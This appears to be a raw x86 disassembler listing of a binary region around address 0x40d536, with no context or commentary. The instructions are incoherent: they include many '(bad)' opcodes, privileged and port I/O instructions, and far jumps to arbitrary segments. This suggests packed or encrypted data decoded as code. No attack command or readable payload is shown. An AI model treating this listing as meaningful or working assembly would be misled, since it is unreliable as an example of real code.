  40d536:	lods   eax,DWORD PTR ds:[esi]
  40d537:	jecxz  0x40d544
  40d539:	and    BYTE PTR [ecx-0x57],bh
  40d53c:	cmp    al,dl
  40d53e:	shr    BYTE PTR [edi+0x70d16500],cl
  40d544:	loope  0x40d4f6
  40d546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d547:	mov    eax,ds:0xacbbbf01
  40d54c:	mov    dl,0x2c
  40d54e:	aas    
  40d54f:	(bad)
  40d552:	aam    0x89
  40d554:	dec    edi
  40d555:	retf   0x5d66
  40d558:	pusha  
  40d559:	ins    BYTE PTR es:[edi],dx
  40d55a:	add    DWORD PTR [ebx+0x4ca34c71],ebx
  40d560:	xor    BYTE PTR [ebp-0x2a],ch
  40d563:	pop    edi
  40d564:	mov    eax,0xe21a38ae
  40d569:	jmp    0x6355:0x28b09312
  40d570:	call   0x9456:0xfc95479d
  40d577:	mov    al,0x5
  40d579:	or     eax,0x52c626d5
  40d57e:	ins    DWORD PTR es:[edi],dx
  40d57f:	and    dh,BYTE PTR [eax]
  40d581:	inc    edx
  40d582:	(bad)  
  40d584:	cmp    al,0xb2
  40d586:	cs push ds
  40d588:	add    bh,BYTE PTR [eax+0x6f]
  40d58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d58c:	jge    0x40d5df
  40d58e:	jg     0x40d5f1
  40d590:	sbb    edx,DWORD PTR [ecx+0x13b17f93]
  40d596:	test   eax,0xe62a2c72
  40d59b:	stos   DWORD PTR es:[edi],eax
  40d59c:	addr16 in al,0xf
  40d59f:	ret    
  40d5a0:	jmp    0x1b6d:0x39004a30
  40d5a7:	jo     0x40d571
  40d5a9:	sbb    al,0x58
  40d5ab:	sub    esp,ebx
  40d5ad:	aaa    
  40d5ae:	imul   eax,DWORD PTR [ebx-0x4f],0x5e667b88
  40d5b5:	jmp    0x40d573
  40d5b7:	jge    0x40d620
  40d5b9:	mov    dl,0xd7
  40d5bb:	sub    eax,0xb5dec0bc
  40d5c0:	adc    al,bh
  40d5c2:	cdq    
  40d5c3:	cmp    DWORD PTR [edx],eax
  40d5c5:	nop
  40d5c6:	cmp    dl,BYTE PTR ds:0x67364062
  40d5cc:	mov    WORD PTR [ecx-0x170b8fa2],?
  40d5d2:	xor    eax,0xed612c14
  40d5d7:	aas    
  40d5d8:	mov    ds,ebp
  40d5da:	mov    esi,0x1aa80766
  40d5df:	les    esi,FWORD PTR [ebx*4-0x6698c20b]
  40d5e6:	dec    ebx
  40d5e7:	std    
  40d5e8:	arpl   bp,cx
  40d5ea:	std    
  40d5eb:	pop    ds
  40d5ec:	shl    BYTE PTR [ecx+0x31e77507],1
  40d5f2:	enter  0x7534,0x6a
  40d5f6:	or     bh,ah
  40d5f8:	add    DWORD PTR [edx+ebx*2-0x2b],esi
  40d5fc:	es (bad) 
  40d5fe:	mov    ds:0x6e0bbcd2,eax
  40d603:	iret   
  40d604:	or     BYTE PTR [esi],dh
  40d606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d607:	cdq    
  40d608:	cwde   
  40d609:	retf   
  40d60a:	dec    ebp
  40d60b:	adc    eax,DWORD PTR [eax+ebp*4-0x2b62c25e]
  40d612:	ret    0x9923
  40d615:	push   esi
  40d616:	cmp    BYTE PTR [eax-0x4f],0xed
  40d61a:	mov    BYTE PTR ds:[edi],bl
  40d61d:	mov    ebp,0x7b41ff82
  40d622:	fsubr  DWORD PTR [esp+ebx*8-0x4e]
  40d626:	aad    0x18
  40d628:	jbe    0x40d603
  40d62a:	ror    DWORD PTR [edx],cl
  40d62c:	xchg   edx,eax
  40d62d:	arpl   WORD PTR [ecx*2+0x1e8da3b1],di
  40d634:	(bad)
  40d637:	lods   eax,DWORD PTR ds:[esi]
  40d638:	adc    DWORD PTR [edi+0x5f],esi
  40d63b:	lds    esp,FWORD PTR [eax+ebx*1]
  40d63e:	mov    esi,DWORD PTR [esp+ebx*1-0x2b8cfb3]
  40d645:	arpl   WORD PTR [eax-0x45760f38],bx
  40d64b:	adc    ebp,DWORD PTR [ebp-0x70]
  40d64e:	add    cl,BYTE PTR [eax-0x7adc7577]
  40d654:	fsubr  DWORD PTR [ecx-0x47]
  40d657:	xor    eax,0x8a440889
  40d65c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d65d:	pushf  
  40d65e:	mov    esi,0xf7e26cb
  40d663:	je     0x40d5eb
  40d665:	pop    esi
  40d666:	push   edx
  40d667:	mov    ah,0x93
  40d669:	xor    bl,dh
  40d66b:	outs   dx,BYTE PTR ds:[esi]
  40d66c:	hlt    
  40d66d:	hlt    
  40d66e:	jmp    0xcb92:0xa810b214
  40d675:	or     cl,BYTE PTR [ecx-0x324590e6]
  40d67b:	push   esp
  40d67c:	loope  0x40d64a
  40d67e:	imul   ecx,DWORD PTR [edi-0x6fbc356c],0x32ecfc26
  40d688:	adc    DWORD PTR [ebx+0x10],ebx
  40d68b:	dec    ecx
  40d68c:	adc    al,0x2a
  40d68e:	paddw  mm4,QWORD PTR [ebp+0x5d45c992]
  40d695:	idiv   DWORD PTR [eax]
  40d697:	inc    ebx
  40d698:	jp     0x40d646
  40d69a:	ss and ecx,edx
  40d69d:	daa    
  40d69e:	sbb    eax,0x529cbd28
  40d6a3:	jno    0x40d627
  40d6a5:	sub    WORD PTR [eax+0x47],si
  40d6a9:	sbb    BYTE PTR [eax-0x14],cl
  40d6ac:	dec    ebp
  40d6ad:	add    DWORD PTR [eax-0x24442166],esp
  40d6b3:	and    bl,BYTE PTR [ebx]
  40d6b5:	test   al,0x84
  40d6b7:	xor    BYTE PTR [esi+eiz*4],ah
  40d6ba:	sub    bl,BYTE PTR [esi+0x38]
  40d6bd:	xchg   ebp,eax
  40d6be:	xchg   BYTE PTR [ebx-0x55],ch
  40d6c1:	inc    eax
  40d6c2:	or     dh,BYTE PTR [ebx+0x12]
  40d6c5:	mov    ds:0xe1845db0,al
  40d6ca:	pop    esp
  40d6cb:	and    al,0x49
  40d6cd:	shr    DWORD PTR [ecx],0x51
  40d6d0:	mov    al,ds:0x6b65de42
  40d6d5:	daa    
  40d6d6:	fmulp  st(2),st
  40d6d8:	(bad)  
  40d6d9:	lock xchg ecx,eax
  40d6db:	cld    
  40d6dc:	out    dx,eax
  40d6dd:	lods   al,BYTE PTR ds:[esi]
  40d6de:	and    esi,edi
  40d6e0:	out    dx,eax
  40d6e1:	icebp  
  40d6e2:	pop    esi
  40d6e3:	xchg   ecx,eax
  40d6e4:	xor    DWORD PTR [esi+esi*8],ecx
  40d6e7:	mov    bh,0x1c
  40d6e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ea:	ds sub al,ah
  40d6ed:	cli    
  40d6ee:	jg     0x40d695
  40d6f0:	into   
  40d6f1:	mov    esp,0xf607d208
  40d6f6:	int    0xc6
  40d6f8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6fa:	out    dx,al
  40d6fb:	jl     0x40d70c
  40d6fd:	fcom   QWORD PTR [esi+0x92f4870]
  40d703:	mov    al,0x9b
  40d705:	(bad)  
  40d706:	push   0xd9e66e20
  40d70b:	stos   DWORD PTR es:[edi],eax
  40d70c:	or     eax,0xdd17f76c
  40d711:	mov    al,ds:0x38004063
  40d716:	cmp    DWORD PTR [ecx-0x72],edx
  40d719:	lahf   
  40d71a:	jle    0x40d6c7
  40d71c:	arpl   WORD PTR [ebx-0x2749305],di
  40d722:	mov    ds:0x81ff0551,eax
  40d727:	jge    0x40d76d
  40d729:	mul    ecx
  40d72b:	sub    al,0x68
  40d72d:	dec    edx
  40d72e:	dec    esi
  40d72f:	dec    ebx
  40d730:	fwait
  40d731:	jecxz  0x40d744
  40d733:	mov    eax,0x9fb626de
  40d738:	out    dx,al
  40d739:	inc    esp
  40d73a:	add    BYTE PTR [esi],bl
  40d73c:	mov    WORD PTR ds:0x2884c4b5,es
  40d742:	out    dx,al
  40d743:	add    eax,edi
  40d745:	push   eax
  40d746:	lahf   
  40d747:	xchg   ebp,eax
  40d748:	mov    ebx,0xbb0c8194
  40d74d:	push   DWORD PTR [eax+0x58]
  40d750:	and    DWORD PTR [ecx-0x35],ebx
  40d753:	sar    DWORD PTR [edi-0x67c6c3de],cl
  40d759:	cmp    al,0x97
  40d75b:	xchg   esi,eax
  40d75c:	(bad)  
  40d75d:	repnz sub al,0xe8
  40d760:	and    dl,BYTE PTR [edx+ebp*4]
  40d763:	dec    eax
  40d764:	mov    ah,0x94
  40d766:	mov    DWORD PTR [esi-0x5e],ebp
  40d769:	pop    ebx
  40d76a:	mov    al,ds:0x92152ec5
  40d76f:	outs   dx,DWORD PTR ds:[esi]
  40d770:	push   esp
  40d771:	xchg   DWORD PTR [ebx-0x1c146fc4],esp
  40d777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d778:	xor    DWORD PTR [eax+edi*1+0x7621c1f7],esp
  40d77f:	lahf   
  40d780:	shl    DWORD PTR [ecx+0x43],1
  40d783:	dec    esp
  40d784:	dec    esp
  40d785:	and    BYTE PTR [esi],ah
  40d787:	jb     0x40d800
  40d789:	jno    0x40d758
  40d78b:	cmp    ebp,DWORD PTR [ebx]
  40d78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d78e:	cld    
  40d78f:	push   0xffffffa1
  40d791:	out    dx,al
  40d792:	shr    BYTE PTR [ebx-0x2f],1
  40d795:	popa   
  40d796:	frstor [edi-0x255b5451]
  40d79c:	push   edi
  40d79d:	hlt    
  40d79e:	(bad)  
  40d79f:	mov    ecx,0x93bf38ba
  40d7a4:	xchg   edx,eax
  40d7a5:	push   es
  40d7a6:	cli    
  40d7a7:	inc    ebp
  40d7a8:	push   ecx
  40d7a9:	das    
  40d7aa:	pop    edx
  40d7ab:	out    dx,al
  40d7ac:	pop    esi
  40d7ad:	(bad)  
  40d7ae:	gs into 
  40d7b0:	push   eax
  40d7b1:	jno    0x40d754
  40d7b3:	call   0xd1d36af4
  40d7b8:	shr    cl,cl
  40d7ba:	rcl    BYTE PTR [edi+0x51802d70],1
  40d7c0:	sub    dl,BYTE PTR [ebp+0x4634ef73]
  40d7c6:	pop    esp
  40d7c7:	add    BYTE PTR [ebx],al
  40d7c9:	push   ebp
  40d7ca:	xor    DWORD PTR [edi+0x53b5f0f3],ebx
  40d7d0:	data16 cmp BYTE PTR [eax],cl
  40d7d3:	sbb    ch,BYTE PTR [edx+0x1342ad08]
  40d7d9:	stc    
  40d7da:	mov    al,0xa2
  40d7dc:	ret    
  40d7dd:	mov    al,al
  40d7df:	push   esp
  40d7e0:	sti    
  40d7e1:	js     0x40d840
  40d7e3:	jmp    0x9bf2:0xb8850d8f
  40d7ea:	pop    ebx
  40d7eb:	sub    bh,BYTE PTR [esi+eiz*2-0x7705e63d]
  40d7f2:	xlat   BYTE PTR ds:[ebx]
  40d7f3:	dec    esi
  40d7f4:	add    eax,0xf723740b
  40d7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7fa:	adc    ah,ah
  40d7fc:	dec    eax
  40d7fd:	dec    eax
  40d7fe:	or     eax,0x6ae63fc3
  40d803:	bound  edi,QWORD PTR [eax+0x6e812c56]
  40d809:	repz lds ebp,FWORD PTR [ecx-0x185ec22b]
  40d810:	cmp    edx,ebx
  40d812:	adc    BYTE PTR [eax+0x761f3cd4],cl
  40d818:	mov    esp,0x1016f210
  40d81d:	iret   
  40d81e:	bound  ebx,QWORD PTR [eax-0x57956cf6]
  40d824:	clc    
  40d825:	jne    0x40d83c
  40d827:	sub    eax,0x194ecde6
  40d82c:	fwait
  40d82d:	mov    bh,0x8c
  40d82f:	cmp    al,0x1c
  40d831:	add    esp,ebp
  40d833:	imul   eax,DWORD PTR [eax-0x3851e59a],0xbd8b452f
  40d83d:	and    BYTE PTR [edi+0x5c9b54e9],bh
  40d843:	imul   ebp,DWORD PTR [edx+0x4a],0xbc8b63d8
  40d84a:	mov    edx,0x1e9b28f
  40d84f:	mov    al,0xf0
  40d852:	adc    ecx,esi
  40d854:	ror    BYTE PTR [ecx+0xd],0xd7
  40d858:	data16 test BYTE PTR [ecx-0x10],0x85
  40d85d:	mov    bh,0xa8
  40d85f:	shl    BYTE PTR [eax-0x7c],0x4
  40d863:	jmp    0x567560e9
  40d868:	cmc    
  40d869:	pop    edx
  40d86a:	push   ds
  40d86b:	sbb    al,al
  40d86d:	mov    esi,0x1ad4d8fa
  40d872:	data16 (bad) 
  40d874:	adc    ebx,ecx
  40d876:	dec    ebx
  40d877:	xchg   esi,eax
  40d878:	fcomp  st(6)
  40d87a:	daa    
  40d87b:	xchg   esi,eax
  40d87c:	pop    esi
  40d87d:	push   ebp
  40d87e:	mov    ds:0x63a76d45,al
  40d883:	xor    al,BYTE PTR [eax-0x33]
  40d886:	sub    al,0xe3
  40d888:	arpl   WORD PTR [esi+edx*8-0x21],di
  40d88c:	push   edi
  40d88d:	aas    
  40d88e:	pop    sp
  40d890:	pushf  
  40d891:	and    DWORD PTR [ecx+0xd],0x63
  40d895:	jno    0x40d864
  40d897:	inc    eax
  40d898:	mov    gs,WORD PTR [ecx-0x4ed828a9]
  40d89e:	ja     0x40d914
  40d8a0:	mov    ebx,0xebf3ed7b
  40d8a5:	cmp    al,0x32
  40d8a7:	ds pop esp
  40d8a9:	mov    esi,0x8a25ccff
  40d8ae:	call   FWORD PTR [ecx]
  40d8b0:	popf   
  40d8b1:	mov    bl,0x93
  40d8b3:	xchg   ebx,eax
  40d8b4:	scas   eax,DWORD PTR es:[edi]
  40d8b5:	popf   
  40d8b6:	sbb    DWORD PTR [ebx+0x5f],0xd393c727
  40d8bd:	addr16 jle 0x40d92b
  40d8c0:	arpl   WORD PTR [edx-0x40],cx
  40d8c3:	(bad)  [esi-0x77]
  40d8c6:	push   DWORD PTR ds:0x28b1
  40d8cb:	ja     0x40d8b6
  40d8cd:	jecxz  0x40d889
  40d8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8d0:	cmp    DWORD PTR [ecx],0xc4145818
  40d8d6:	cmp    cl,0x5d
  40d8d9:	pop    di
  40d8db:	sar    BYTE PTR es:[esi-0x163634d0],cl
  40d8e2:	or     al,0xd4
  40d8e4:	popa   
  40d8e5:	cmp    DWORD PTR [esi-0x6a],ecx
  40d8e8:	pusha  
  40d8e9:	aas    
  40d8ea:	mov    ds:0xf2cdb52a,al
  40d8ef:	aas    
  40d8f0:	sub    ah,BYTE PTR [edx+0x54]
  40d8f3:	xchg   bl,ah
  40d8f5:	xacquire xchg BYTE PTR [edi-0x44],bl
  40d8f9:	sbb    DWORD PTR [eax],eax
  40d8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8fd:	(bad)  [esi]
  40d8ff:	sar    DWORD PTR [edx-0x78],0xdd
  40d903:	cdq    
  40d904:	mov    cl,0x6a
  40d906:	call   0x999232
  40d90b:	icebp  
  40d90c:	adc    BYTE PTR [esi-0x72],0x7a
  40d910:	data16 test BYTE PTR [edx+0x23],bh
  40d914:	es sbb ah,al
  40d917:	cmp    edx,DWORD PTR [eax+0x4a]
  40d91a:	mov    ebp,0x1317dda9
  40d91f:	ror    DWORD PTR [edx-0x3a8de117],cl
  40d925:	push   ss
  40d926:	adc    eax,0x2bb4cb63
  40d92b:	push   ecx
  40d92c:	pop    eax
  40d92d:	sbb    bl,0x60
  40d930:	push   es
  40d931:	inc    ebx
  40d932:	mov    ah,ah
  40d934:	add    DWORD PTR [ebx+0x4a],0x58
  40d938:	xor    ecx,ecx
  40d93a:	pop    edi
  40d93b:	mov    esp,DWORD PTR [eax+0x556e540]
  40d941:	pop    ebx
  40d942:	inc    edi
  40d943:	sub    eax,0x6a05ce55
  40d948:	push   es
  40d949:	loope  0x40d95d
  40d94b:	call   0xd9b1:0x1369df3b
  40d952:	mov    cl,0x7
  40d954:	adc    DWORD PTR [eax+edx*8],ecx
  40d957:	sbb    ebp,DWORD PTR ss:[edi]
  40d95a:	aad    0xf7
  40d95c:	mov    dl,0x33
  40d95e:	add    al,0x8f
  40d960:	(bad)  
  40d961:	adc    eax,0xaf1fe7fe
  40d966:	adc    dl,BYTE PTR ss:[edi-0x6d]
  40d96a:	sbb    esi,DWORD PTR [esi]
  40d96c:	scas   al,BYTE PTR es:[edi]
  40d96d:	test   eax,0x6d380019
  40d972:	xlat   BYTE PTR ds:[ebx]
  40d973:	xor    DWORD PTR [esi-0x43],esp
  40d976:	inc    eax
  40d977:	test   eax,0x44819513
  40d97c:	hlt    
  40d97d:	dec    esp
  40d97e:	int    0xc
  40d980:	mov    esi,0x6c44e417
  40d985:	or     bl,BYTE PTR [ebx+0x7ff82860]
  40d98b:	xchg   ebx,eax
  40d98c:	pop    esp
  40d98d:	inc    edi
  40d98e:	idiv   DWORD PTR [eax]
  40d990:	out    dx,eax
  40d991:	xor    DWORD PTR [eax],ebp
  40d993:	mov    al,0x75
  40d995:	aaa    
  40d996:	cld    
  40d997:	(bad)  
  40d998:	retf   0x3081
  40d99b:	mov    dl,0xd1
  40d99d:	jge    0x40d95d
  40d99f:	mov    dl,0x88
  40d9a1:	or     DWORD PTR [ebp+0x5f],edx
  40d9a4:	sub    DWORD PTR [ebx],ecx
  40d9a6:	shl    BYTE PTR [ecx+0x13],cl
  40d9a9:	inc    esp
  40d9aa:	push   ds
  40d9ab:	test   ah,dl
  40d9ad:	mov    ch,0xe8
  40d9af:	inc    edi
  40d9b0:	sbb    DWORD PTR [ebp+0x78],eax
  40d9b3:	pusha  
  40d9b4:	mov    DWORD PTR [eax-0xc],ebp
  40d9b7:	mov    cl,0x6
  40d9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ba:	iret   
  40d9bb:	sub    eax,0x25db9f9
  40d9c0:	not    bh
  40d9c2:	fstp   QWORD PTR [edx-0x28]
  40d9c5:	in     eax,dx
  40d9c6:	call   0x2c900b5
  40d9cb:	inc    edx
  40d9cc:	aam    0x2f
  40d9ce:	mov    cl,0x67
  40d9d0:	sbb    dl,BYTE PTR [ebp-0x58]
  40d9d3:	pop    ds
  40d9d4:	fcom   QWORD PTR [ebx]
  40d9d6:	clts   
  40d9d8:	imul   DWORD PTR [esi]
  40d9da:	fisub  WORD PTR [edx]
  40d9dc:	mov    ecx,0xc613544
  40d9e1:	xor    DWORD PTR [edi],ebx
  40d9e3:	aas    
  40d9e4:	cmc    
  40d9e5:	mov    BYTE PTR [ecx+0x694a62e7],al
  40d9eb:	je     0x40d97a
  40d9ed:	out    dx,eax
  40d9ee:	pusha  
  40d9ef:	repnz mov esi,edi
  40d9f2:	dec    ebp
  40d9f3:	mov    eax,0x3da1b3b2
  40d9f8:	mov    ebx,0x3937fe95
  40d9fd:	in     al,dx
  40d9fe:	mov    ch,0xcb
  40da00:	xor    bl,BYTE PTR [ebx+eax*4]
  40da03:	test   DWORD PTR [ebp-0x17],edx
  40da06:	jae    0x40da1a
  40da08:	hlt    
  40da09:	pop    ebp
  40da0a:	inc    eax
  40da0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da0c:	aam    0xbf
  40da0e:	pop    edi
  40da0f:	mov    cl,0x8a
  40da11:	retf   
  40da12:	pop    esp
  40da13:	cli    
  40da14:	push   ecx
  40da15:	call   0x3327:0xbbab64ec
  40da1c:	adc    eax,0x8dec087c
  40da21:	stos   DWORD PTR es:[edi],eax
  40da22:	and    esp,DWORD PTR [edi-0x7b]
  40da25:	mov    WORD PTR [ebp+0x73],ds
  40da28:	inc    esi
  40da29:	in     eax,0x2f
  40da2b:	add    eax,ebx
  40da2d:	ja     0x40da0b
  40da2f:	jno    0x40d9dd
  40da31:	stos   DWORD PTR es:[edi],eax
  40da32:	sti    
  40da33:	stos   DWORD PTR es:[edi],eax
  40da34:	inc    eax
  40da35:	mov    cl,0xc3
  40da37:	fsub   QWORD PTR [eax+eax*8]
  40da3a:	idiv   BYTE PTR [eax+0x7]
  40da3d:	push   ds
  40da3e:	push   ebx
  40da3f:	or     al,0xe2
  40da41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da42:	pop    ds
  40da43:	and    ebp,DWORD PTR [esi-0x11]
  40da46:	dec    edi
  40da47:	mov    ebx,0xe07acd26
  40da4c:	in     al,dx
  40da4d:	sbb    al,0x3d
  40da4f:	or     eax,DWORD PTR [ebx*8-0x542c74be]
  40da56:	inc    ebx
  40da57:	mov    edi,0x40757141
  40da5c:	cdq    
  40da5d:	ret    
  40da5e:	stos   BYTE PTR es:[edi],al
  40da5f:	xchg   esp,eax
  40da60:	into   
  40da61:	jp     0x40da80
  40da63:	(bad)  
  40da64:	stos   BYTE PTR es:[edi],al
  40da65:	mov    WORD PTR [esi],ss
  40da67:	fisub  DWORD PTR [esi+0x573ecb57]
  40da6d:	dec    edi
  40da6e:	or     dh,BYTE PTR [ebx-0x46e46244]
  40da74:	pop    ss
  40da75:	xor    al,0xf8
  40da77:	sbb    BYTE PTR [ebp+0x7db8cb3a],dh
  40da7d:	iret   
  40da7e:	fist   DWORD PTR [edi]
  40da80:	cmp    ecx,0xd64fd97e
  40da86:	jne    0x40da98
  40da88:	mov    dl,0xd1
  40da8a:	cmp    BYTE PTR gs:[ecx+0x696040bb],cl
  40da91:	push   ecx
  40da92:	mov    ch,0x5a
  40da94:	jmp    0xf9c2907a
  40da99:	nop
  40da9a:	jb     0x40da8b
  40da9c:	imul   eax,DWORD PTR [ebx-0x3f7a789e],0x59
  40daa3:	add    ecx,DWORD PTR [edx+eax*8-0x2e34b0d3]
  40daaa:	xchg   edx,eax
  40daab:	adc    eax,0x3fe7ac7d
  40dab0:	popf   
  40dab1:	push   ss
  40dab2:	sub    ebp,esi
  40dab4:	aaa    
  40dab5:	xor    dl,BYTE PTR [ecx-0x9ae8091]
  40dabb:	sbb    DWORD PTR [ecx-0x3c453e07],0xffffffdd
  40dac2:	pop    edi
  40dac3:	adc    eax,0x52e57fd1
  40dac8:	push   es
  40dac9:	pop    edx
  40daca:	mov    esi,0x4df86a8a
  40dacf:	or     eax,0xeac5bca
  40dad4:	inc    ebp
  40dad5:	push   0xfffffff0
  40dad7:	dec    ebx
  40dad8:	or     eax,0xb8384ebc
  40dadd:	das    
  40dade:	push   0x4c
  40dae0:	mov    eax,0x973392a8
  40dae5:	jmp    0x26f568d7
  40daea:	(bad)  
  40daeb:	mov    esi,0x304141cf
  40daf0:	or     DWORD PTR [ebx-0x65],ecx
  40daf3:	scas   eax,DWORD PTR es:[edi]
  40daf4:	imul   edx,DWORD PTR [ebx-0x6b40962f],0x539be2
  40dafe:	sbb    al,0xe0
  40db00:	in     eax,dx
  40db01:	outs   dx,BYTE PTR ds:[esi]
  40db02:	push   esi
  40db03:	jmp    0x65b31290
  40db08:	in     eax,0xe3
  40db0a:	inc    ebx
  40db0b:	mov    edx,0xc39ab867
  40db10:	(bad)  
  40db11:	push   ecx
  40db12:	fiadd  WORD PTR [esi-0x2e9963dd]
  40db18:	xchg   esp,eax
  40db19:	sub    al,0x1a
  40db1b:	imul   ebx,DWORD PTR [edi+0x47],0xba4294bc
  40db22:	mov    esi,DWORD PTR [ebp-0x44a66773]
  40db28:	pop    esi
  40db29:	mov    ah,0x1a
  40db2b:	and    eax,0xa76f8b8a
  40db30:	mov    ds:0xdba2c17b,al
  40db35:	stc    
  40db36:	adc    DWORD PTR ds:0x5bff9fb7,edi
  40db3c:	push   0x134cc745
  40db41:	mov    cl,0x2e
  40db43:	mov    al,ds:0xe3a124e3
  40db48:	or     cl,BYTE PTR ds:0xca8fc29c
  40db4e:	stos   BYTE PTR es:[edi],al
  40db4f:	cld    
  40db50:	repnz or DWORD PTR [ecx+0x39d07076],edx
  40db57:	cli    
  40db58:	jge    0x40db9f
  40db5a:	inc    ecx
  40db5b:	nop
  40db5c:	retf   0x985b
  40db5f:	push   edi
  40db60:	imul   esi,DWORD PTR ds:0xe02616ac,0x47
  40db67:	cdq    
  40db68:	pop    edi
  40db69:	adc    eax,0xd1314f54
  40db6e:	fst    st(3)
  40db70:	lock and al,0x42
  40db73:	adc    ebp,DWORD PTR ds:0x2e5a81b1
  40db79:	ret    
  40db7a:	xchg   ebx,eax
  40db7b:	(bad)
  40db7e:	jo     0x40db02
  40db80:	mov    ch,0xb3
  40db82:	cld    
  40db83:	lock mov ebx,0x890c9e03
  40db89:	int    0x30
  40db8b:	cmp    BYTE PTR [esi+ebp*8-0x63],0x55
  40db90:	int    0xaa
  40db92:	inc    edi
  40db93:	lock and BYTE PTR [ecx],dl
  40db96:	fistp  QWORD PTR [esi+0xa]
  40db99:	sub    BYTE PTR [ecx+0x6cca7e9c],cl
  40db9f:	mov    ds:0xf3e9fd49,al
  40dba4:	xor    BYTE PTR [esi-0x7a5bcb4b],dh
  40dbaa:	cmp    DWORD PTR [edi+0x60],ecx
  40dbad:	inc    esp
  40dbae:	call   0xa7a3:0x63ff3ace
  40dbb5:	sti    
  40dbb6:	scas   eax,DWORD PTR es:[edi]
  40dbb7:	pop    esi
  40dbb8:	loope  0x40db62
  40dbba:	mov    esi,0xf3922279
  40dbbf:	int3   
  40dbc0:	jmp    0xc8ae:0x24bef64
  40dbc7:	add    al,0xc4
  40dbc9:	add    BYTE PTR [ecx+edi*1],ch
  40dbcc:	xchg   al,ch
  40dbce:	fld    DWORD PTR [esi+ebp*8+0x1449cd8e]
  40dbd5:	cmp    al,0x2e
  40dbd7:	dec    esi
  40dbd8:	in     eax,0xe1
  40dbda:	gs jae 0x40dbaf
  40dbdd:	push   0x4b
  40dbdf:	ds mov ebx,0xa6873fff
  40dbe5:	dec    ebx
  40dbe6:	and    esi,DWORD PTR [esi+0x658295f0]
  40dbec:	imul   ecx,DWORD PTR [esi+edi*8-0x24eedb4f],0xafc3c2cc
  40dbf7:	add    DWORD PTR [edx+0x51],esp
  40dbfa:	imul   esi,DWORD PTR [eax],0xffffffc6
  40dbfd:	pinsrw mm5,WORD PTR [ebp+ecx*1-0x3235db4d],0xa6
  40dc06:	sub    al,0xef
  40dc08:	cdq    
  40dc09:	mov    dl,0x5c
  40dc0b:	inc    eax
  40dc0c:	lock aaa 
  40dc0e:	dec    ebp
  40dc0f:	mov    ds:0xa7b53793,eax
  40dc14:	pusha  
  40dc15:	push   DWORD PTR [esi]
  40dc17:	das    
  40dc18:	test   eax,0x84446a50
  40dc1d:	stc    
  40dc1e:	and    al,0x1c
  40dc20:	mov    ebp,0x885c0e60
  40dc25:	push   ebx
  40dc26:	pop    ss
  40dc27:	cmp    dh,ah
  40dc29:	call   0xb79bf3f2
  40dc2e:	xchg   BYTE PTR [esi+0xc419788],bl
  40dc34:	pusha  
  40dc35:	and    ah,BYTE PTR [ebx-0x1050c4c0]
  40dc3b:	jnp    0x40dcb0
  40dc3d:	popf   
  40dc3e:	add    dh,dh
  40dc40:	push   esi
  40dc41:	xlat   BYTE PTR ds:[ebx]
  40dc42:	call   0x4667:0xf581ebf9
  40dc49:	in     eax,0x95
  40dc4b:	aas    
  40dc4c:	out    0xa5,al
  40dc4e:	mov    ch,0xca
  40dc50:	inc    ebx
  40dc51:	jne    0x40dc93
  40dc53:	aam    0x5b
  40dc55:	faddp  st(0),st
  40dc57:	(bad)  
  40dc58:	sahf   
  40dc59:	test   BYTE PTR [ecx-0x1ae4a3c0],ah
  40dc5f:	lea    edi,[ebp+eax*4+0x18]
  40dc63:	jno    0x40dc91
  40dc65:	out    0x22,eax
  40dc67:	pop    eax
  40dc68:	jmp    0x40dc6a
  40dc6a:	mov    cl,0x3f
  40dc6c:	jp     0x40dc37
  40dc6e:	mov    al,0x85
  40dc70:	xor    al,0x1c
  40dc72:	and    edi,DWORD PTR [ebp-0x5eba8e4a]
  40dc78:	scas   al,BYTE PTR es:[edi]
  40dc79:	add    DWORD PTR [ecx],0xffffffde
  40dc7c:	daa    
  40dc7d:	add    BYTE PTR [edx+0x13],cl
  40dc80:	repnz sar BYTE PTR [ecx],0x49
  40dc84:	iret   
  40dc85:	inc    ebx
  40dc86:	push   ecx
  40dc87:	aas    
  40dc88:	add    eax,0x259f6994
  40dc8d:	cld    
  40dc8e:	std    
  40dc8f:	xor    eax,0x8db126e4
  40dc94:	nop
  40dc95:	adc    al,0x76
  40dc97:	lahf   
  40dc98:	in     al,0xfb
  40dc9a:	jae    0x40dcdb
  40dc9c:	fcom   QWORD PTR [ecx-0x17334d0b]
  40dca2:	xchg   esp,eax
  40dca3:	push   esp
  40dca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca5:	adc    eax,0x3ba13276
  40dcaa:	xlat   BYTE PTR ds:[ebx]
  40dcab:	cmp    al,0x9b
  40dcad:	mov    dl,0x87
  40dcaf:	popa   
  40dcb0:	jmp    0x1529200e
  40dcb5:	std    
  40dcb6:	mov    eax,ds:0xc36f15ed
  40dcbb:	cmp    ebx,ebp
  40dcbd:	pusha  
  40dcbe:	aaa    
  40dcbf:	mov    DWORD PTR [esi],esi
  40dcc1:	es pop edi
  40dcc3:	iret   
  40dcc4:	inc    ecx
  40dcc5:	pop    ds
  40dcc6:	jne    0x40dcec
  40dcc8:	dec    ebx
  40dcc9:	repnz ins DWORD PTR es:[edi],dx
  40dccb:	mov    eax,0x352b11c4
  40dcd0:	mov    edi,0x554ea66f
  40dcd5:	or     edi,DWORD PTR [eax]
  40dcd7:	call   0x4a8a15b6
  40dcdc:	mov    WORD PTR [ecx+ebx*8],gs
  40dcdf:	mov    al,0xec
  40dce1:	shl    BYTE PTR [eax+0x537fa5c9],0xd7
  40dce8:	pop    ss
  40dce9:	adc    DWORD PTR [esi+0x69],esp
